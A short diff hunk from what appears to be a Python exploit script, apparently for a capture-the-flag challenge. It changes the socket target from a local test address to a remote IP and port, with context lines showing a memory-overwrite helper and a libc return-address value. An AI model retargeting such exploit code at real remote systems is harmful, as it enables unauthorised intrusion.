@@ -36,7 +36,7 @@ def swap(offset, value):
             break
     return int(res)
 
-sock = socket.create_connection(("127.0.0.1", 7777))
+sock = socket.create_connection(("188.40.18.75", 1234))
 
 wait_for("custom\n:")
 libc_ret = swap(8, 0x41414141)
